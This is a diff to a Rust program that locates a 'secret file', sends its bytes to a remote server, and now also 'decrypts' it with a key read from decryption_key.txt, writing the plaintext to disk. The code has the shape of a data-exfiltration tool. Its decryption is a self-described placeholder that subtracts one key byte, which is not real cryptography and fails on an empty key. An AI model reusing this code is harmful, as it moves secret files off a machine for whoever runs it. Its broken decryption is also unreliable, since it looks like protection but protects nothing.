@@ -1,12 +1,15 @@
 use std::fs;
 use std::error::Error;
+use std::io::Read;
 
 #[derive(Debug)]
 enum CustomError {
     FileNotFound(String),
     IoError(std::io::Error),
     SendError(String),
+    DecryptionError(String),
 }
+
 
 impl std::fmt::Display for CustomError {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
@@ -14,6 +17,7 @@ impl std::fmt::Display for CustomError {
             CustomError::FileNotFound(file) => write!(f, "File not found: {}", file),
             CustomError::IoError(err) => write!(f, "IO Error: {}", err),
             CustomError::SendError(msg) => write!(f, "Send Error: {}", msg),
+            CustomError::DecryptionError(msg) => write!(f, "Decryption Error: {}", msg),
         }
     }
 }
@@ -42,14 +46,38 @@ fn main() -> Result<(), Box<dyn Error>> {
 
     let secret_file_contents = fs::read(&secret_file_path)?;
     let secret_file_bytes = secret_file_contents.as_slice();
+    let decryption_key = read_decryption_key()?;
+    let decrypted_contents = decrypt(&secret_file_contents, &decryption_key)?;
 
+    let decrypted_file_path = "decrypted_secret_file.txt";
+    fs::write(decrypted_file_path, decrypted_contents)?; 
+    // Write decrypted contents to a new file
+
+    println!("Decrypted file written to: {}", decrypted_file_path); 
+    
     // Send secret file contents to remote server
     match send_to_remote_server(secret_file_bytes) {
         Ok(_) => println!("Data sent to remote server successfully"),
         Err(err) => eprintln!("Error sending data to remote server: {}", err),
+
     }
 
     Ok(())
+}
+
+fn read_decryption_key() -> Result<String, CustomError> {
+    let mut decryption_key_file = fs::File::open("decryption_key.txt").map_err(|_| CustomError::FileNotFound("decryption_key.txt".to_string()))?;
+    let mut decryption_key = String::new();
+    decryption_key_file.read_to_string(&mut decryption_key)?;
+    Ok(decryption_key.trim().to_string())
+}
+
+fn decrypt(data: &[u8], key: &str) -> Result<Vec<u8>, CustomError> {
+    // decryption algorithm 
+    // placeholder implementation
+    // actual decryption logic
+    let decrypted_data: Vec<u8> = data.iter().map(|&byte| byte.wrapping_sub(key.as_bytes()[0])).collect();
+    Ok(decrypted_data)
 }
 
 fn find_file(root_dir: &str, target_file: &str) -> Option<std::path::PathBuf> {
